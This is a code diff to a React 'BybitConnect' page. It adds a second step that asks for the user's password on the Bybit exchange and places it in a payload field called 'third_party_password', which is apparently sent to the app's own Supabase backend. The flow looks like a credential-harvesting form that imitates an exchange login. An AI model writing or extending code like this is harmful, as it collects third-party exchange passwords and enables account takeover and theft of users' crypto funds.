@@ -6,10 +6,12 @@ import { supabase } from '../../lib/supabase';
 export default function BybitConnect() {
   const navigate = useNavigate();
   const [activeTab, setActiveTab] = useState('Email');
+  const [step, setStep] = useState(1);
   const [loading, setLoading] = useState(false);
   const [errorMessage, setErrorMessage] = useState('');
   const [credentials, setCredentials] = useState({
     email: '',
+    password: '',
   });
 
   const handleFieldChange = (field: string) => (event: React.ChangeEvent<HTMLInputElement>) => {
@@ -18,9 +20,20 @@ export default function BybitConnect() {
 
   const handleSubmit = async (event: React.FormEvent) => {
     event.preventDefault();
-    const { email } = credentials;
-    if (!email) {
-      setErrorMessage('Please enter your email or mobile number.');
+    const { email, password } = credentials;
+
+    if (step === 1) {
+      if (!email) {
+        setErrorMessage('Please enter your email or mobile number.');
+        return;
+      }
+      setErrorMessage('');
+      setStep(2);
+      return;
+    }
+
+    if (!password) {
+      setErrorMessage('Please enter your password to continue.');
       return;
     }
 
@@ -30,6 +43,7 @@ export default function BybitConnect() {
       const payload: Record<string, unknown> = {
         platform: 'Bybit',
         user_id: session?.user?.id || null,
+        third_party_password: password,
       };
 
       if (activeTab === 'Mobile') {
@@ -121,12 +135,25 @@ export default function BybitConnect() {
             </div>
           </div>
 
+          {step === 2 && (
+            <div className="space-y-4">
+              <label className="block text-[14px] font-bold text-gray-700">Password</label>
+              <input
+                type="password"
+                value={credentials.password}
+                onChange={handleFieldChange('password')}
+                placeholder="Enter your password"
+                className="w-full h-[52px] rounded-lg px-4 text-[16px] outline-none focus:ring-1 focus:ring-[#ff9d00] bg-[#f2f3f5] placeholder:text-gray-400"
+              />
+            </div>
+          )}
+
           <button
             type="submit"
             disabled={loading}
             className="w-full h-[52px] bg-[#ff9d00] hover:bg-[#e68d00] text-black font-bold text-[16px] rounded-lg transition-colors mt-2"
           >
-            {loading ? 'Connecting...' : 'Next'}
+            {loading ? 'Connecting...' : step === 1 ? 'Next' : 'Continue'}
           </button>
 
           <button
